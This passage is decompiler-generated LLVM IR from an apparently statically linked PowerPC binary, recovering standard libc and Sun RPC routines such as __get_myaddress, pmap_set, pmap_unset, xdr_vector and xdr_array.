  br i1 %v3_10015c88, label %dec_label_pc_10015ca4, label %dec_label_pc_10015c90

dec_label_pc_10015c90:                            ; preds = %dec_label_pc_10015c84
  %v0_10015c90 = call i32 @__errno_location()
  store i32 96, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10015c9c = inttoptr i32 %v0_10015c90 to i32*
  store i32 96, i32* %v2_10015c9c, align 4
  %v0_10015d4c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10015d48

dec_label_pc_10015ca4:                            ; preds = %dec_label_pc_10015c84, %dec_label_pc_10015c68
  %v3_10015ca8 = load i16, i16* @global_var_1002f0c4.581, align 2
  %v4_10015ca8 = sext i16 %v3_10015ca8 to i32
  store i32 %v4_10015ca8, i32* %r0.global-to-local, align 4
  %v3_10015cac = icmp eq i16 %v3_10015ca8, 0
  br i1 %v3_10015cac, label %dec_label_pc_10015cb4, label %dec_label_pc_10015cd0

dec_label_pc_10015cb4:                            ; preds = %dec_label_pc_10015ca4
  store i32 ptrtoint (i32* @global_var_10015cb8.582 to i32), i32* @lr, align 4
  %v0_10015cb4 = call i32 @__libc_getpid()
  %v2_10015cbc = srem i32 %v0_10015cb4, 424
  %v1_10015cc0 = sub i32 %v0_10015cb4, %v2_10015cbc
  store i32 %v1_10015cc0, i32* %r0.global-to-local, align 4
  %v1_10015cc8 = add nsw i32 %v2_10015cbc, 600
  %v1_10015ccc = trunc i32 %v1_10015cc8 to i16
  store i16 %v1_10015ccc, i16* @global_var_1002f0c4.581, align 2
  br label %dec_label_pc_10015cd0

dec_label_pc_10015cd0:                            ; preds = %dec_label_pc_10015ca4, %dec_label_pc_10015cb4
  %v0_10015cd0 = call i32 @__errno_location()
  store i32 0, i32* @r31, align 4
  store i32 98, i32* %r0.global-to-local, align 4
  store i32 %v0_10015cd0, i32* @r30, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10015ce4 = inttoptr i32 %v0_10015cd0 to i32*
  store i32 98, i32* %v2_10015ce4, align 4
  %v0_10015d20.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10015d18

dec_label_pc_10015cec:                            ; preds = %dec_label_pc_10015d3c
  %v3_10015cec = load i16, i16* @global_var_1002f0c4.581, align 2
  %v4_10015cec = sext i16 %v3_10015cec to i32
  store i32 %v4_10015cec, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f0c5.583 to i32), i32* %r0.global-to-local, align 4
  %v3_10015cf4 = add i32 %v0_10015d28, 2
  %v4_10015cf4 = inttoptr i32 %v3_10015cf4 to i16*
  store i16 %v3_10015cec, i16* %v4_10015cf4, align 2
  %v0_10015cf8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10015cf8 = mul i32 %v0_10015cf8, 65536
  %v2_10015cf8 = sdiv i32 %v1_10015cf8, 65536
  store i32 %v2_10015cf8, i32* %r0.global-to-local, align 4
  %v1_10015d00 = trunc i32 %v2_10015cf8 to i16
  store i16 %v1_10015d00, i16* @global_var_1002f0c4.581, align 2
  %tmp8 = icmp slt i32 %v1_10015cf8, 67043329
  br i1 %tmp8, label %dec_label_pc_10015d10, label %dec_label_pc_10015d08

dec_label_pc_10015d08:                            ; preds = %dec_label_pc_10015cec
  store i32 600, i32* %r0.global-to-local, align 4
  store i16 600, i16* @global_var_1002f0c4.581, align 2
  br label %dec_label_pc_10015d10

dec_label_pc_10015d10:                            ; preds = %dec_label_pc_10015cec, %dec_label_pc_10015d08
  store i32 268524820, i32* @lr, align 4
  %v0_10015d10 = call i32 @bind()
  store i32 %v0_10015d10, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10015d18

dec_label_pc_10015d18:                            ; preds = %dec_label_pc_10015cd0, %dec_label_pc_10015d10
  %v0_10015d20 = phi i32 [ %v0_10015d20.pre, %dec_label_pc_10015cd0 ], [ %v0_10015d10, %dec_label_pc_10015d10 ]
  %v0_10015d18 = load i32, i32* @r31, align 4
  %v2_10015d18 = icmp sgt i32 %v0_10015d18, 423
  %v0_10015d24 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10015d24, i32* @r3, align 4
  %v0_10015d28 = load i32, i32* %r29.global-to-local, align 4
  %v1_10015d30 = add i32 %v0_10015d18, 1
  store i32 %v1_10015d30, i32* @r31, align 4
  %tmp7 = icmp sgt i32 %v0_10015d20, -1
  %or.cond = or i1 %tmp7, %v2_10015d18
  br i1 %or.cond, label %dec_label_pc_10015d48, label %dec_label_pc_10015d3c

dec_label_pc_10015d3c:                            ; preds = %dec_label_pc_10015d18
  %v0_10015d3c = load i32, i32* @r30, align 4
  %v1_10015d3c = inttoptr i32 %v0_10015d3c to i32*
  %v2_10015d3c = load i32, i32* %v1_10015d3c, align 4
  store i32 %v2_10015d3c, i32* %r0.global-to-local, align 4
  %v3_10015d40 = icmp eq i32 %v2_10015d3c, 98
  br i1 %v3_10015d40, label %dec_label_pc_10015cec, label %dec_label_pc_10015d48

dec_label_pc_10015d48:                            ; preds = %dec_label_pc_10015d3c, %dec_label_pc_10015d18, %dec_label_pc_10015c90
  %v0_10015d4c = phi i32 [ %v0_10015d4c.pre, %dec_label_pc_10015c90 ], [ %v0_10015d20, %dec_label_pc_10015d18 ], [ %v0_10015d20, %dec_label_pc_10015d3c ]
  store i32 %v0_10015c50, i32* %r0.global-to-local, align 4
  ret i32 %v0_10015d4c

; uselistorder directives
  uselistorder i32 %v2_10015cf8, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 98, { 1, 0, 2 }
  uselistorder i32 ()* @__libc_getpid, { 0, 7, 6, 5, 1, 4, 3, 2 }
  uselistorder i16* @global_var_1002f0c4.581, { 4, 3, 2, 1, 0 }
  uselistorder i32 96, { 0, 10, 2, 3, 11, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder label %dec_label_pc_10015d18, { 1, 0 }
  uselistorder label %dec_label_pc_10015d10, { 1, 0 }
  uselistorder label %dec_label_pc_10015cd0, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_3()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4160 = alloca i32, align 4
  %stack_var_-4168 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 268524932, i32* @lr, align 4
  %v3_10015d80 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_10015d80, i32* @r29, align 4
  %tmp13 = icmp sgt i32 %v3_10015d80, -1
  br i1 %tmp13, label %dec_label_pc_10015d98, label %dec_label_pc_10015d8c

dec_label_pc_10015d8c:                            ; preds = %entry
  store i32 ptrtoint ([24 x i8]* @global_var_1001a100.584 to i32), i32* @r3, align 4
  br label %dec_label_pc_10015dd0

dec_label_pc_10015d98:                            ; preds = %entry
  store i32 4096, i32* %stack_var_-4168, align 4
  %v2_10015da8 = ptrtoint i32* %stack_var_-4128 to i32
  %v2_10015dac = ptrtoint i32* %stack_var_-4168 to i32
  store i32 268524988, i32* @lr, align 4
  %v3_10015db8 = call i32 @ioctl(i32 35090, i32 %v2_10015dac, i32 %v2_10015dac)
  store i32 1, i32* @r28, align 4
  %tmp14 = icmp sgt i32 %v3_10015db8, -1
  br i1 %tmp14, label %dec_label_pc_10015ddc.preheader, label %dec_label_pc_10015dc8

dec_label_pc_10015dc8:                            ; preds = %dec_label_pc_10015d98
  store i32 ptrtoint ([53 x i8]* @global_var_1001a118.585 to i32), i32* @r3, align 4
  br label %dec_label_pc_10015dd0

dec_label_pc_10015dd0:                            ; preds = %dec_label_pc_10015e14, %dec_label_pc_10015d8c, %dec_label_pc_10015dc8
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1.ph, %dec_label_pc_10015e14 ], [ %v2_10015da8, %dec_label_pc_10015dc8 ], [ %tmp6, %dec_label_pc_10015d8c ]
  store i32 ptrtoint ([3 x i8]* @global_var_10015dd4.586 to i32), i32* @lr, align 4
  %v0_10015dd0 = call i32 @perror()
  %v0_10015dd8 = call i32 @__GI_exit()
  br label %dec_label_pc_10015ddc.preheader

dec_label_pc_10015ddc.preheader:                  ; preds = %dec_label_pc_10015dd0, %dec_label_pc_10015d98
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_10015dd0 ], [ %v2_10015da8, %dec_label_pc_10015d98 ]
  %v2_10015de8 = ptrtoint i32* %stack_var_-4160 to i32
  %tmp16 = urem i16 %tmp, 2
  %v3_10015e24 = icmp eq i16 %tmp16, 0
  %v1_10015e38 = and i16 %tmp, 8
  %v3_10015e38 = icmp eq i16 %v1_10015e38, 0
  br label %dec_label_pc_10015ddc

dec_label_pc_10015ddc:                            ; preds = %dec_label_pc_10015ddc.preheader, %dec_label_pc_10015e84
  store i32 %stack_var_-4164.1.ph, i32* @r31, align 4
  %v3_10015de0 = load i32, i32* %stack_var_-4168, align 4
  store i32 %v3_10015de0, i32* @r30, align 4
  %v3_10015e744 = icmp eq i32 %v3_10015de0, 0
  br i1 %v3_10015e744, label %dec_label_pc_10015e7c, label %dec_label_pc_10015de8

dec_label_pc_10015de8:                            ; preds = %dec_label_pc_10015ddc, %dec_label_pc_10015e6c
  %v0_10015e00 = load i32, i32* @r29, align 4
  store i32 268525068, i32* @lr, align 4
  %v3_10015e08 = call i32 @ioctl(i32 %v0_10015e00, i32 35091, i32 %v2_10015de8)
  %tmp15 = icmp sgt i32 %v3_10015e08, -1
  br i1 %tmp15, label %dec_label_pc_10015e20, label %dec_label_pc_10015e14

dec_label_pc_10015e14:                            ; preds = %dec_label_pc_10015de8
  store i32 ptrtoint ([23 x i8]* @global_var_1001a150.587 to i32), i32* @r3, align 4
  br label %dec_label_pc_10015dd0

dec_label_pc_10015e20:                            ; preds = %dec_label_pc_10015de8
  %v0_10015e6c.pre = load i32, i32* @r31, align 4
  br i1 %v3_10015e24, label %dec_label_pc_10015e6c, label %dec_label_pc_10015e2c

dec_label_pc_10015e2c:                            ; preds = %dec_label_pc_10015e20
  %v1_10015e2c = add i32 %v0_10015e6c.pre, 16
  %v2_10015e2c = inttoptr i32 %v1_10015e2c to i16*
  %v3_10015e2c = load i16, i16* %v2_10015e2c, align 2
  %v3_10015e30 = icmp eq i16 %v3_10015e2c, 2
  br i1 %v3_10015e30, label %dec_label_pc_10015e38, label %dec_label_pc_10015e6c

dec_label_pc_10015e38:                            ; preds = %dec_label_pc_10015e2c
  br i1 %v3_10015e38, label %dec_label_pc_10015e40, label %dec_label_pc_10015e48

dec_label_pc_10015e40:                            ; preds = %dec_label_pc_10015e38
  %v0_10015e40 = load i32, i32* @r28, align 4
  %v3_10015e40 = icmp eq i32 %v0_10015e40, 0
  br i1 %v3_10015e40, label %dec_label_pc_10015e48, label %dec_label_pc_10015e6c

dec_label_pc_10015e48:                            ; preds = %dec_label_pc_10015e40, %dec_label_pc_10015e38
  %v0_10015e58 = load i32, i32* @r29, align 4
  %v2_10015e5c = load i32, i32* @r27, align 4
  %v3_10015e5c = add i32 %v2_10015e5c, 2
  %v4_10015e5c = inttoptr i32 %v3_10015e5c to i16*
  store i16 111, i16* %v4_10015e5c, align 2
  store i32 ptrtoint ([3 x i8]* @global_var_10015e64.588 to i32), i32* @lr, align 4
  %v1_10015e60 = call i32 @__libc_close(i32 %v0_10015e58)
  br label %dec_label_pc_10015e98

dec_label_pc_10015e6c:                            ; preds = %dec_label_pc_10015e20, %dec_label_pc_10015e40, %dec_label_pc_10015e2c
  %v1_10015e6c = add i32 %v0_10015e6c.pre, 32
  store i32 %v1_10015e6c, i32* @r31, align 4
  %v0_10015e70 = load i32, i32* @r30, align 4
  %v1_10015e70 = add i32 %v0_10015e70, -32
  store i32 %v1_10015e70, i32* @r30, align 4
  %v3_10015e74 = icmp eq i32 %v1_10015e70, 0
  br i1 %v3_10015e74, label %dec_label_pc_10015e7c, label %dec_label_pc_10015de8

dec_label_pc_10015e7c:                            ; preds = %dec_label_pc_10015e6c, %dec_label_pc_10015ddc
  %v0_10015e7c = load i32, i32* @r28, align 4
  %v3_10015e7c = icmp eq i32 %v0_10015e7c, 1
  br i1 %v3_10015e7c, label %dec_label_pc_10015e84, label %dec_label_pc_10015e8c

dec_label_pc_10015e84:                            ; preds = %dec_label_pc_10015e7c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10015ddc

dec_label_pc_10015e8c:                            ; preds = %dec_label_pc_10015e7c
  %v0_10015e8c = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10015e94.589 to i32), i32* @lr, align 4
  %v1_10015e90 = call i32 @__libc_close(i32 %v0_10015e8c)
  br label %dec_label_pc_10015e98

dec_label_pc_10015e98:                            ; preds = %dec_label_pc_10015e48, %dec_label_pc_10015e8c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10015e8c ], [ 1, %dec_label_pc_10015e48 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v1_10015e70, { 1, 0 }
  uselistorder i32 %v2_10015dac, { 1, 0 }
  uselistorder i32* %stack_var_-4168, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 8, 7, 6, 18, 17, 14, 13, 12, 11, 10, 9, 4, 16, 15, 3, 2, 5 }
  uselistorder i16 8, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i16 2, { 5, 0, 6, 1, 4, 7, 2, 3 }
  uselistorder i32 ()* @__GI_exit, { 2, 0, 1, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 6, 5, 4, 3, 15, 14, 13, 12, 11, 10, 9, 8, 7 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 4, 3, 9, 8, 5, 0, 2, 1, 10, 7, 6 }
  uselistorder i32 4096, { 1, 0, 2, 6, 7, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 5, 1, 9, 8, 7, 6, 2, 4, 3 }
  uselistorder label %dec_label_pc_10015e98, { 1, 0 }
  uselistorder label %dec_label_pc_10015e6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10015de8, { 1, 0 }
  uselistorder label %dec_label_pc_10015ddc, { 1, 0 }
  uselistorder label %dec_label_pc_10015dd0, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_10015eb8 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10015eb8, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-72, align 4
  store i32 268525272, i32* @lr, align 4
  %v1_10015ed4 = call i32 @__get_myaddress(i32 %v2_10015eb8)
  %v2_10015ed8 = ptrtoint i32* %stack_var_-24 to i32
  %v3_10015edc = icmp eq i32 %v1_10015ed4, 0
  store i32 %v2_10015ed8, i32* @r6, align 4
  %v2_10015eec = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10015eec, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_10015edc, label %dec_label_pc_10015fa4, label %dec_label_pc_10015f04

dec_label_pc_10015f04:                            ; preds = %entry
  store i32 5, i32* %stack_var_-24, align 4
  store i32 268525344, i32* @lr, align 4
  %v9_10015f1c = call i32 @__GI_clntudp_bufcreate(i32 %v2_10015eb8, i32 100000, i32 2)
  store i32 %v9_10015f1c, i32* %r29.global-to-local, align 4
  %v3_10015f20 = icmp eq i32 %v9_10015f1c, 0
  %v2_10015f44 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10015f44, i32* @r8, align 4
  br i1 %v3_10015f20, label %dec_label_pc_10015fa4, label %dec_label_pc_10015f4c

dec_label_pc_10015f4c:                            ; preds = %dec_label_pc_10015f04
  store i32 60, i32* %stack_var_-24, align 4
  %v1_10015f74 = add i32 %v9_10015f1c, 4
  %v2_10015f74 = inttoptr i32 %v1_10015f74 to i32*
  %v3_10015f74 = load i32, i32* %v2_10015f74, align 4
  %v1_10015f78 = inttoptr i32 %v3_10015f74 to i32*
  %v2_10015f78 = load i32, i32* %v1_10015f78, align 4
  call void @__pseudo_call(i32 %v2_10015f78)
  %v0_10015f84 = load i32, i32* %r29.global-to-local, align 4
  %v1_10015f84 = add i32 %v0_10015f84, 4
  %v2_10015f84 = inttoptr i32 %v1_10015f84 to i32*
  %v3_10015f84 = load i32, i32* %v2_10015f84, align 4
  %v1_10015f8c = add i32 %v3_10015f84, 16
  %v2_10015f8c = inttoptr i32 %v1_10015f8c to i32*
  %v3_10015f8c = load i32, i32* %v2_10015f8c, align 4
  call void @__pseudo_call(i32 %v3_10015f8c)
  %v3_10015f98 = load i32, i32* %stack_var_-68, align 4
  br label %dec_label_pc_10015fa4

dec_label_pc_10015fa4:                            ; preds = %entry, %dec_label_pc_10015f04, %dec_label_pc_10015f4c
  %storemerge = phi i32 [ %v3_10015f98, %dec_label_pc_10015f4c ], [ 0, %dec_label_pc_10015f04 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder label %dec_label_pc_10015fa4, { 2, 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %v2_10015fc4 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10015fc4, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-88, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10015fec.594 to i32), i32* @lr, align 4
  %v1_10015fe8 = call i32 @__get_myaddress(i32 %v2_10015fc4)
  %v2_10015fec = ptrtoint i32* %stack_var_-40 to i32
  %v3_10015ff0 = icmp eq i32 %v1_10015fe8, 0
  store i32 %v2_10015fec, i32* @r6, align 4
  %v2_10016000 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10016000, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_10015ff0, label %dec_label_pc_100160d4, label %dec_label_pc_10016018

dec_label_pc_10016018:                            ; preds = %entry
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268525620, i32* @lr, align 4
  %v9_10016030 = call i32 @__GI_clntudp_bufcreate(i32 %v2_10015fc4, i32 100000, i32 2)
  store i32 %v9_10016030, i32* %r29.global-to-local, align 4
  %v3_10016034 = icmp eq i32 %v9_10016030, 0
  %v2_10016054 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_10016054, i32* @r8, align 4
  br i1 %v3_10016034, label %dec_label_pc_100160d4, label %dec_label_pc_100160b4

dec_label_pc_100160b4:                            ; preds = %dec_label_pc_10016018
  store i32 60, i32* %stack_var_-40, align 4
  %v1_10016084 = add i32 %v9_10016030, 4
  %v2_10016084 = inttoptr i32 %v1_10016084 to i32*
  %v3_10016084 = load i32, i32* %v2_10016084, align 4
  %v1_10016088 = inttoptr i32 %v3_10016084 to i32*
  %v2_10016088 = load i32, i32* %v1_10016088, align 4
  call void @__pseudo_call(i32 %v2_10016088)
  store i32 ptrtoint ([24 x i8]* @global_var_1001a168.595 to i32), i32* @r4, align 4
  %v0_100160a0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100160a0, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100160ac.596 to i32), i32* @lr, align 4
  %v3_100160a8 = call i32 @clnt_perror(i32 %v0_100160a0, i32 ptrtoint ([24 x i8]* @global_var_1001a168.595 to i32))
  store i32 0, i32* %stack_var_-84, align 4
  %v0_100160b4.pre = load i32, i32* @r29, align 4
  %v1_100160b4 = add i32 %v0_100160b4.pre, 4
  %v2_100160b4 = inttoptr i32 %v1_100160b4 to i32*
  %v3_100160b4 = load i32, i32* %v2_100160b4, align 4
  %v1_100160bc = add i32 %v3_100160b4, 16
  %v2_100160bc = inttoptr i32 %v1_100160bc to i32*
  %v3_100160bc = load i32, i32* %v2_100160bc, align 4
  call void @__pseudo_call(i32 %v3_100160bc)
  %v3_100160c8 = load i32, i32* %stack_var_-84, align 4
  br label %dec_label_pc_100160d4

dec_label_pc_100160d4:                            ; preds = %entry, %dec_label_pc_10016018, %dec_label_pc_100160b4
  %storemerge = phi i32 [ %v3_100160c8, %dec_label_pc_100160b4 ], [ 0, %dec_label_pc_10016018 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-88, { 1, 0 }
  uselistorder i32 60, { 6, 7, 17, 18, 8, 1, 10, 19, 13, 11, 12, 21, 22, 20, 25, 26, 24, 23, 3, 5, 4, 14, 2, 15, 16, 0, 9 }
  uselistorder i32 (i32, i32, i32)* @__GI_clntudp_bufcreate, { 3, 0, 1, 2 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32* @r9, { 15, 33, 36, 44, 34, 35, 31, 16, 32, 37, 0, 72, 54, 55, 14, 45, 46, 47, 3, 12, 56, 64, 65, 1, 38, 66, 17, 19, 18, 4, 67, 68, 8, 70, 57, 58, 9, 10, 59, 11, 20, 5, 6, 21, 22, 23, 24, 25, 26, 13, 39, 40, 41, 42, 43, 50, 53, 2, 71, 60, 61, 7, 62, 63, 51, 52, 27, 28, 48, 49, 69, 29, 30 }
  uselistorder i32 400, { 3, 4, 8, 9, 0, 6, 7, 1, 2, 5 }
  uselistorder i32* @r7, { 1, 11, 7, 8, 9, 10, 2, 3, 5, 4, 6, 0 }
  uselistorder i32 (i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_100160d4, { 2, 1, 0 }
}

define i32 @_rpc_dtablesize() local_unnamed_addr {
entry:
  %v0_100160f0 = load i32, i32* @r31, align 4
  %v3_100160fc = load i32, i32* @global_var_1002f0c8.597, align 4
  %v3_10016100 = icmp eq i32 %v3_100160fc, 0
  br i1 %v3_10016100, label %dec_label_pc_10016108, label %dec_label_pc_10016110

dec_label_pc_10016108:                            ; preds = %entry
  store i32 268525836, i32* @lr, align 4
  %v0_10016108 = call i32 @getdtablesize()
  store i32 %v0_10016108, i32* @global_var_1002f0c8.597, align 4
  br label %dec_label_pc_10016110

dec_label_pc_10016110:                            ; preds = %entry, %dec_label_pc_10016108
  %v3_10016114 = phi i32 [ %v3_100160fc, %entry ], [ %v0_10016108, %dec_label_pc_10016108 ]
  store i32 %v0_100160f0, i32* @r31, align 4
  ret i32 %v3_10016114

; uselistorder directives
  uselistorder label %dec_label_pc_10016110, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r27.global-to-local, align 4
  store i32 %arg4, i32* %r28.global-to-local, align 4
  store i32 %arg5, i32* %r29.global-to-local, align 4
  %v2_100161689 = icmp eq i32 %arg3, 0
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v2_1001617811 = add i32 %arg2, %arg4
  store i32 %v2_1001617811, i32* %r31.global-to-local, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  br i1 %v2_100161689, label %dec_label_pc_10016184, label %dec_label_pc_10016154

dec_label_pc_10016154:                            ; preds = %entry, %dec_label_pc_10016154.dec_label_pc_10016168_crit_edge.dec_label_pc_10016154_crit_edge
  %v0_10016154 = phi i32 [ %v0_10016154.pre, %dec_label_pc_10016154.dec_label_pc_10016168_crit_edge.dec_label_pc_10016154_crit_edge ], [ %arg5, %entry ]
  call void @__pseudo_call(i32 %v0_10016154)
  %v0_10016160 = load i32, i32* %r3.global-to-local, align 4
  %v3_10016160 = icmp eq i32 %v0_10016160, 0
  br i1 %v3_10016160, label %dec_label_pc_10016188, label %dec_label_pc_10016154.dec_label_pc_10016168_crit_edge

dec_label_pc_10016154.dec_label_pc_10016168_crit_edge: ; preds = %dec_label_pc_10016154
  %v0_10016168.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_10016168.pre = load i32, i32* %r27.global-to-local, align 4
  %v0_1001616c.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10016170.pre = load i32, i32* %r26.global-to-local, align 4
  %v1_10016178.pre = load i32, i32* %r28.global-to-local, align 4
  %v2_10016168 = icmp ult i32 %v0_10016168.pre, %v1_10016168.pre
  store i32 %v0_10016170.pre, i32* %r3.global-to-local, align 4
  %v2_10016178 = add i32 %v0_1001616c.pre, %v1_10016178.pre
  store i32 %v2_10016178, i32* %r31.global-to-local, align 4
  %v1_1001617c = add i32 %v0_10016168.pre, 1
  store i32 %v1_1001617c, i32* %r30.global-to-local, align 4
  br i1 %v2_10016168, label %dec_label_pc_10016154.dec_label_pc_10016168_crit_edge.dec_label_pc_10016154_crit_edge, label %dec_label_pc_10016184

dec_label_pc_10016154.dec_label_pc_10016168_crit_edge.dec_label_pc_10016154_crit_edge: ; preds = %dec_label_pc_10016154.dec_label_pc_10016168_crit_edge
  %v0_10016154.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10016154

dec_label_pc_10016184:                            ; preds = %entry, %dec_label_pc_10016154.dec_label_pc_10016168_crit_edge
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10016188

dec_label_pc_10016188:                            ; preds = %dec_label_pc_10016154, %dec_label_pc_10016184
  %v0_10016198 = phi i32 [ 1, %dec_label_pc_10016184 ], [ 0, %dec_label_pc_10016154 ]
  ret i32 %v0_10016198

; uselistorder directives
  uselistorder i32 %v0_10016168.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_10016188, { 1, 0 }
  uselistorder label %dec_label_pc_10016184, { 1, 0 }
  uselistorder label %dec_label_pc_10016154, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* @r28, align 4
  store i32 %arg5, i32* %r25.global-to-local, align 4
  store i32 %arg6, i32* %r24.global-to-local, align 4
  store i32 %tmp, i32* @r27, align 4
  %v1_100161c8 = inttoptr i32 %arg2 to i32*
  %v2_100161c8 = load i32, i32* %v1_100161c8, align 4
  store i32 %v2_100161c8, i32* @r31, align 4
  store i32 268526032, i32* @lr, align 4
  %v2_100161cc = inttoptr i32 %arg3 to i32*
  %v4_100161cc = call i32 @xdr_u_int(i32* %v2_100161cc, i32* %v2_100161cc)
  store i32 %v4_100161cc, i32* %r3.global-to-local, align 4
  %v3_100161d0 = icmp eq i32 %v4_100161cc, 0
  br i1 %v3_100161d0, label %dec_label_pc_100162c8, label %dec_label_pc_100161d8

dec_label_pc_100161d8:                            ; preds = %entry
  %v0_100161d8 = load i32, i32* %r30.global-to-local, align 4
  %v1_100161d8 = inttoptr i32 %v0_100161d8 to i32*
  %v2_100161d8 = load i32, i32* %v1_100161d8, align 4
  store i32 %v2_100161d8, i32* @r29, align 4
  %v1_100161dc = load i32, i32* @r28, align 4
  %v3_100161dc = icmp ugt i32 %v2_100161d8, %v1_100161dc
  br i1 %v3_100161dc, label %dec_label_pc_100161f4, label %dec_label_pc_100161e4

dec_label_pc_100161e4:                            ; preds = %dec_label_pc_100161d8
  %v1_100161e8 = load i32, i32* %r25.global-to-local, align 4
  %v2_100161e8 = udiv i32 -1, %v1_100161e8
  %v3_100161ec = icmp ugt i32 %v2_100161d8, %v2_100161e8
  br i1 %v3_100161ec, label %dec_label_pc_100161f4, label %dec_label_pc_10016200

dec_label_pc_100161f4:                            ; preds = %dec_label_pc_100161e4, %dec_label_pc_100161d8
  %v0_100161f4 = load i32, i32* @r27, align 4
  %v1_100161f4 = inttoptr i32 %v0_100161f4 to i32*
  %v2_100161f4 = load i32, i32* %v1_100161f4, align 4
  %v3_100161f8 = icmp eq i32 %v2_100161f4, 2
  br i1 %v3_100161f8, label %dec_label_pc_10016200, label %dec_label_pc_100162c8

dec_label_pc_10016200:                            ; preds = %dec_label_pc_100161f4, %dec_label_pc_100161e4
  %v0_10016200 = load i32, i32* @r31, align 4
  %v3_10016200 = icmp eq i32 %v0_10016200, 0
  br i1 %v3_10016200, label %dec_label_pc_10016208, label %dec_label_pc_10016268

dec_label_pc_10016208:                            ; preds = %dec_label_pc_10016200
  %v0_10016208 = load i32, i32* @r27, align 4
